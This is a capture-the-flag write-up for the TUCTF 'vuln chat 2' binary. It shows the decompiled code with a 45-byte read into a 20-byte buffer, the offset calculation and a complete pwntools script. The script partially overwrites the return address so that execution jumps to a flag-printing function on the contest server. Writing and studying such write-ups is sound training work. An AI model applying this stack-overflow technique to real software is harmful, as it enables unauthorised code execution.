# vuln chat 2

Let's take a look at that binary:

```
$	file vuln-chat2.0 
vuln-chat2.0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=093fe7a291a796024f450a3081c4bda8a215e6e8, not stripped
$	pwn checksec vuln-chat2.0 
[*] '/Hackery/tuctf/vuln_chat2/vuln-chat2.0'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Let's run the elf to see what it does:

```
$	./vuln-chat2.0 
----------- Welcome to vuln-chat2.0 -------------
Enter your username: guyinatuxedo
Welcome guyinatuxedo!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: You've proven yourself to me. What information do you need?
guyinatuxedo: The flag
djinn: Alright here's you flag:
djinn: flag{1_l0v3_l337_73x7}
djinn: Wait thats not right...
```

The flag it gave us there is not the correct flag.

So we can see that it is pretty similar to the previous challenge. It prints texts, and prompts us for input twice. Let's take a look at the code (the part we will be looking at is the `doThings` function):

```
int doThings()
{
  char buf[20]; // [sp+1h] [bp-27h]@1
  char username[15]; // [sp+15h] [bp-13h]@1

  puts("----------- Welcome to vuln-chat2.0 -------------");
  printf("Enter your username: ");
  __isoc99_scanf("%15s", username);
  printf("Welcome %s!\n", username);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: You've proven yourself to me. What information do you need?");
  printf("%s: ", username);
  read(0, buf, 0x2Du);
  puts("djinn: Alright here's you flag:");
  puts("djinn: flag{1_l0v3_l337_73x7}");
  return puts("djinn: Wait thats not right...");
}
```

So we can see that it scans in 15 bytes of data into the char array `username`, so we can't overflow that. However it scans `0x2d` (45) bytes into `buf` which is only 20 bytes so we can overflow that. Let's take a look at the stack:

```
-00000027 buf             db 20 dup(?)
-00000013 username        db 15 dup(?)
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

Let's find the offset between `buf` and the return address:

```
>>> 0x4 - -0x27
43
```

So offset is 43 bytes. So we can only overwrite the last two bytes of the return address. However luckily for us there is a function called `printFlag` which will print out the flag for us. When this function is called, the return address will be `0x8048668`, since that is the next instruction in main after `doThings` is called. Let's find the address of `printFlag`:

```
gdb-peda$ p printFlag
$1 = {<text variable, no debug info>} 0x8048672 <printFlag>
```

So the address of `printFlag` is `0x8048672`. Even though we can write only to the last two bytes of the return address, we can still call `printFlag`. This is because the first two bytes is the same, so we only need to overwrite the last two bytes to call `printFlag`. With this we can write our exploit:

```
#Import pwntools
from pwn import *

#Establish the target
#target = process('vuln-chat2.0')
target = remote('vulnchat2.tuctf.com', 4242)

#Print out the text up to the username prompt
print target.recvuntil('Enter your username: ')

#Send the username, doesn't really matter
target.sendline('guyinatuxedo')

#Print the text up to the next prompt
print target.recvuntil('guyinatuxedo: ')

#Construct the payload, and send it
payload = `0`*0x2b + "\x72\x86"
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

when we run the exploit:

```
$ python exploit.py 
[+] Opening connection to vulnchat2.tuctf.com on port 4242: Done
----------- Welcome to vuln-chat2.0 -------------
Enter your username: 
Welcome guyinatuxedo!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: You've proven yourself to me. What information do you need?
guyinatuxedo: 
[*] Switching to interactive mode
djinn: Alright here's you flag:
djinn: flag{1_l0v3_l337_73x7}
djinn: Wait thats not right...
Ah! Found it
TUCTF{0n3_by73_15_4ll_y0u_n33d}
Don't let anyone get ahold of this
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to vulnchat2.tuctf.com port 4242
```

Just like that, we captured the flag!
